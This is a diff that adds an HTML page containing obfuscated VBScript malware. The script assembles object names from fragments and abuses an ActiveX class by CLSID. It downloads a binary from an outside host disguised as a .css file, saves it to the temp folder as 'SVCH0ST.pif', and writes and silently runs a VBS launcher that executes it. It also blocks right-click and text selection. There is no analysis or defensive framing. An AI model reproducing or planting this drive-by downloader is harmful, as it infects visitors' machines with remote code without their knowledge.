@@ -1,0 +1,84 @@
+/*
+*/
+<html>
+<body>
+</body>
+
+
+<script language=VBScript>
+On Error Resume Next
+jinshansigaddressssssssss = "http://user999.78-10.net/ms.css"                           
+jinshansigobj="o"
+jinshansigobjs="b"
+jinshansigobjss="j"
+jinshansigobjsss="e"
+jinshansigobjssss="c"
+jinshansigobjsssss="t"
+Set jinshansig_2_cnn = document.createElement(jinshansigobj&jinshansigobjs&jinshansigobjss&jinshansigobjsss&jinshansigobjssss&jinshansigobjsssss)
+jinshansigun="clsid:"
+jinshansigunx="BD"
+jinshansigun2="96"
+jinshansigun3="C5"
+jinshansigun4="56-6"
+jinshansigun5="5A"
+jinshansigun6="3-1"
+jinshansigun7="1D"
+jinshansigun8="0-98"
+jinshansigun9="3A-0"
+jinshansigun10="0C0"
+jinshansigun11="4FC"
+jinshansigun12="29E"
+jinshansigun13="36"
+jinshansig3="Microsoft.X"
+jinshansig4="MLHTTp"
+jinshansig5="G"
+jinshansig6="E"
+jinshansig7="T"
+jinshansigxml="M"&"i"&"c"&"r"&"osof"&"t.XM"&"LHTTp"
+jinshansig_2_cnn.SetAttribute "classid", jinshansigun&jinshansigunx&jinshansigun2&jinshansigun3&jinshansigun4&jinshansigun5&jinshansigun6&jinshansigun7&jinshansigun8&jinshansigun9&jinshansigun10&jinshansigun11&jinshansigun12&jinshansigun13
+Set kaobinuodun=jinshansig_2_cnn.CreateObject(jinshansigxml,"")
+kaobinuodun.Open jinshansig5&jinshansig6&jinshansig7, jinshansigaddressssssssss, False
+kaobinuodun.Send
+jinshansigbuffe="SVCH0ST.pif"
+jinshansig_kfqq_sssssssss="SVCH0ST.vbs"
+Q784378237="Scripting."
+Q784378237s="FileSyst"
+Q784378237ss="emObject"
+Q784378237sss="Adod"
+Q784378237ssss="b.stream"
+Q784378237sssss=Q784378237sss&Q784378237ssss
+Set chilam = jinshansig_2_cnn.createobject(Q784378237&Q784378237s&Q784378237ss,"")
+Set yingying = chilam.GetSpecialFolder(2)
+jinshansiguser="chilam"
+jinshansigbuffe=chilam.BuildPath(yingying,jinshansigbuffe)
+jinshansig_kfqq_sssssssss=chilam.BuildPath(yingying,jinshansig_kfqq_sssssssss)
+Set chilams = jinshansig_2_cnn.createobject(Q784378237sssss,"")
+chilams.type=1
+chilams.Open
+chilams.Write kaobinuodun.Responsebody
+chilams.Savetofile jinshansigbuffe,2
+chilams.Close
+chilams.Type=2
+chilams.Open
+chilams.WriteText  "'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"Set i_love_jinshansig = CreateObject(""Wscript"&".Shell"")"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"i_love_jinshansig.run ("""&jinshansigbuffe&""")"&vbCrLf&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"
+chilams.Savetofile jinshansig_kfqq_sssssssss,2
+chilams.Close
+www="She"
+cute="ll.A"
+qq="ppl"
+cn="ica"
+kfqq="tion"
+Set shanimabi = jinshansig_2_cnn.createobject(www&cute&qq&cn&kfqq, "")
+jinshansigdk="O"
+jinshansigdks="p"
+jinshansigdkss="e"
+jinshansigdksss="n"
+shanimabi.ShellExeCute jinshansig_kfqq_sssssssss, "", "", jinshansigdk&jinshansigdks&jinshansigdkss&jinshansigdksss, 0
+
+
+</script>
+                               
+
+</html>
+<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>     
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
